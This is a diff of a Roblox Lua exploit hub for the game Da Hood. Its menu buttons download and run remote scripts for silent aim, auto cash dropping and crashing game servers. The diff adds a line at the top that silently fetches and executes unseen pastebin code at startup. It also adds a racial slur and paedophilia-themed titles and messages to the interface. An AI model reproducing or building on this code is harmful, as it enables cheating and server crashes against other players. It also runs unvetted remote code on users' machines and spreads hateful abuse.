@@ -1,6 +1,24 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/1mMWWDXE"))()
+wait(0.5)
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+   Text = "[Notice] GUI Last Updated 5-10-21 , Hey Peter";
+   Color = Color3.new(255, 0, 72);
+   Font = Enum.Font.SourceSansBold;
+   FontSize = Enum.FontSize.Size24;
+})
+
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+   Text = "[Warning] By EXECUTING this GUI you are now a segistered sex offender!";
+   Color = Color3.new(255, 0, 0);
+   Font = Enum.Font.SourceSansBold;
+   FontSize = Enum.FontSize.Size24;
+})
+
+
+
 -- init
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GreenDeno/Venyx-UI-Library/main/source.lua"))()
-local venyx = library.new("Da Hood Fucker Last Updated 5-8-21", 5013109572)
+local venyx = library.new("PedoFile Gui    Nooy Is A Nigger", 5013109572)
 
 -- themes
 local themes = {
@@ -13,182 +31,182 @@ TextColor = Color3.fromRGB(255, 255, 255)
 }
 
 -- first page
-local page = venyx:addPage("Guis", 5012544693)
-local section1 = page:addSection("Gui Page")
+local page = venyx:addPage("Best Scripts", 5012544693)
+local section1 = page:addSection("Scripts")
 local section2 = page:addSection("KeyBind")
-
-section1:addButton("LegacyX", function()
-repeat
-    wait();
-until game:IsLoaded();
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Compwnter/LegacyX/main/script.lua'))();
-end)
-
-section1:addButton("LegacyX Key", function()
-setclipboard("5bfa8f0c6c03818a87bd2cd9e3dcc2179218d8ab5905509ba2616511eabe744d")
-end)
-
-section1:addButton("Zordion", function()
-repeat
-wait()
-until game:IsLoaded()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/zordion/main/script.lua"))()end)
-
-section1:addButton("Zordion Key", function()
-setclipboard("zordioniscool")
-end)
 
 section1:addButton("Valiant", function()
 loadstring(game:HttpGet(("https://pastebin.com/raw/FMnCZbW5"), true))();
-end)
-
-section1:addButton("Da-Hoodian Ware", function()
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Enviie/Cypher-X-DaHoodian-Ware/main/Cypher%20X%20DaHoodian-Ware%20Main.lua"))("Enviie Soo Hot!")
-end)
-
-section1:addButton("RaycodeX", function()
-loadstring(game:GetObjects("rbxassetid://5812737894")[1].Source)()
-end)
-
-section1:addButton("NightX", function()
-loadstring(game:HttpGet(("https://pastebin.com/raw/u0Tg3PsM"), true))();
 end)
 
 section1:addButton("Swag Mode", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002"))()
 end)
 
-section1:addButton("Lora X New", function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/XptzExploits/dahood/main/loraxnew"))()
-end)
-
-section1:addButton("Lora X Old", function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/XptzExploits/dahood/main/loraxold"))()
-end)
-
-local page2 = venyx:addPage("Solo Scripts", 5012544693)
-local section11 = page2:addSection("Script Page")
-
-section11:addButton("Anti Stomp", function()
-loadstring(game:HttpGet("https://pastebin.com/raw/hJTKLHvS"))()
-end)
-
-section11:addButton("Audio Logger", function()
-loadstring(game:HttpGet("https://pastebin.com/raw/iXtePLpF"))()
-end)
-
-section11:addButton("Silent Aim", function()
+section1:addButton("Silent Aim", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/wfwf/main/aimbot"))()
 end)
 
-section11:addButton("Auto Arrest Autofarm", function()
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Arrest"), true))();
-end)
-
-section11:addButton("Cash Drop", function()
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()
-end)
-
-section11:addButton("Da Hood Crashed", function()
+section1:addButton("Da Hood Crasher", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
 end)
 
-section11:addButton("Da Hood Crashed 2", function()
+section1:addButton("Da Hood Crashed 2", function()
 loadstring(game:HttpGet("loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()", true))()
 end)
 
-section11:addButton("DO NOT LEAVE THE SERVER while CRASHING", function()
-print("DONt")
+-- thrid page
+local page = venyx:addPage("Guis", 5012544693)
+local section3 = page:addSection("Gui Page")
+section3:addButton("LegacyX", function()
+repeat
+    wait();
+until game:IsLoaded();
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Compwnter/LegacyX/main/script.lua'))();
 end)
 
+section3:addButton("LegacyX Key", function()
+setclipboard("5bfa8f0c6c03818a87bd2cd9e3dcc2179218d8ab5905509ba2616511eabe744d")
+end)
 
-local page4 = venyx:addPage("Ids", 5012544693)
-local section11 = page4:addSection("Ids")
+section3:addButton("Zordion", function()
+repeat
+wait()
+until game:IsLoaded()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/zordion/main/script.lua"))()end)
 
-section11:addButton("Mexican BOP", function()
+section3:addButton("Zordion Key", function()
+setclipboard("zordioniscool")
+end)
+
+section3:addButton("Da-Hoodian Ware (Shitty Silent Aim)", function()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Enviie/Cypher-X-DaHoodian-Ware/main/Cypher%20X%20DaHoodian-Ware%20Main.lua"))("Enviie Soo Hot!")
+end)
+
+section3:addButton("RaycodeX", function()
+loadstring(game:GetObjects("rbxassetid://5812737894")[1].Source)()
+end)
+
+section3:addButton("NightX", function()
+loadstring(game:HttpGet(("https://pastebin.com/raw/u0Tg3PsM"), true))();
+end)
+
+section3:addButton("Lora X New", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XptzExploits/dahood/main/loraxnew"))()
+end)
+
+section3:addButton("Lora X Old", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XptzExploits/dahood/main/loraxold"))()
+end)
+
+-- fourth page
+local page = venyx:addPage("Solo Scripts", 5012544693)
+local section4 = page:addSection("Script Page")
+
+section4:addButton("Anti Stomp", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/hJTKLHvS"))()
+end)
+
+section4:addButton("Audio Logger", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/iXtePLpF"))()
+end)
+
+section4:addButton("Ray Code Cash Dropper", function()
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()
+end)
+
+-- fith page
+local page = venyx:addPage("Music Ids", 5012544693)
+local section5 = page:addSection("Ids")
+
+section5:addButton("Mexican BOP", function()
 setclipboard("5972127403")
 end)
 
-section11:addButton("EMOTEGI - UNDER MY SKIN", function()
+section5:addButton("EMOTEGI - UNDER MY SKIN", function()
 setclipboard("4498153931")
 end)
 
-section11:addButton("Alabama Neighbor", function()
+section5:addButton("Alabama Neighbor", function()
 setclipboard("6546444546")
 end)
 
-section11:addButton("BUSTER -$atori Zoom", function()
+section5:addButton("BUSTER -$atori Zoom", function()
 setclipboard("5971707317")
 end)
 
-section11:addButton("Ong - kwuzi", function()
+section5:addButton("Ong - kwuzi", function()
 setclipboard("6607366358")
 end)
 
-section11:addButton("yameii - baby my phone", function()
+section5:addButton("yameii - baby my phone", function()
 setclipboard("6457694642")
 end)
 
-section11:addButton("Lil Darkie - drink my piss you nasty slut yeah yeah", function()
+section5:addButton("Lil Darkie - drink my piss you nasty slut yeah yeah", function()
 setclipboard("5578146842")
 end)
 
 
-section11:addButton("C2D - With my hoe", function()
+section5:addButton("C2D - With my hoe", function()
 setclipboard("5790506499")
 end)
 
-section11:addButton("#BrooklynBloodPop", function()
+section5:addButton("#BrooklynBloodPop", function()
 setclipboard("6528607507")
 end)
 
-section11:addButton("Deadx - I Will Break My Own Heart", function()
+section5:addButton("Deadx - I Will Break My Own Heart", function()
 setclipboard("5012734344")
 end)
 
-local page6 = venyx:addPage("Discords", 5012544693)
-local section11 = page6:addSection("Discord Servers")
+section5:addButton("Lieu - Drain", function()
+setclipboard("6741212947 ")
+end)
 
-section11:addButton("Legacyx Discord", function()
+
+section5:addButton("Weeekly(위클리) - After School (K-Pop)", function()
+setclipboard("6556456475 ")
+end)
+
+-- sixth page
+local page = venyx:addPage("Discord Invites", 5012544693)
+local section6 = page:addSection("Servers")
+
+section6:addButton("Legacyx Discord", function()
 setclipboard("https://discord.io/legacyx")
 end)
 
-section11:addButton("RaycodeX Discord", function()
+section6:addButton("RaycodeX Discord", function()
 setclipboard("https://discord.gg/S3zZz9Zgdu")
 end)
 
-section11:addButton("Swagmode Discord", function()
+section6:addButton("Swagmode Discord", function()
 setclipboard("https://discord.gg/gR2U2RpFXs")
 end)
 
-section11:addButton("Valiant Discord", function()
+section6:addButton("Valiant Discord", function()
 setclipboard("https://discord.gg/gR2U2RpFXs")
 end)
 
-section11:addButton("Cypher X Discord", function()
+section6:addButton("Cypher X Discord", function()
 setclipboard("https://discord.com/invite/Q63u37Tctc")
 end)
 
 
-local page5 = venyx:addPage("Change Log", 5012544693)
-local section11 = page5:addSection("Change Log")
+-- seventh page
+local page = venyx:addPage("Change Logs", 5012544693)
+local section7 = page:addSection("Updates")
 
-section11:addButton("5-8-21 Last Updated", function()
-print("5-8-21 Last Updated")
+section7:addButton("5-10-21 Last Updated", function()
+print("5-10-21 Last Updated")
 end)
 
-section11:addButton("Added Da-Hoodian Ware & IDS", function()
-print("5-8-21 Last Updated")
+section7:addButton("Changed Alot", function()
+print("5-10-21 Last Updated")
 end)
 
 
-
-
-
-section2:addKeybind("Toggle Keybind", Enum.KeyCode.KeypadOne, function()
-venyx:toggle()
-end, function()
-end)
 
 -- second page
 local theme = venyx:addPage("Theme", 5012544693)
@@ -199,6 +217,11 @@ colors:addColorPicker(theme, color, function(color3)
 venyx:setTheme(theme, color3)
 end)
 end
+
+section2:addKeybind("Toggle Keybind", Enum.KeyCode.KeypadOne, function()
+venyx:toggle()
+end, function()
+end)
 
 -- load
 venyx:SelectPage(venyx.pages[1], true)
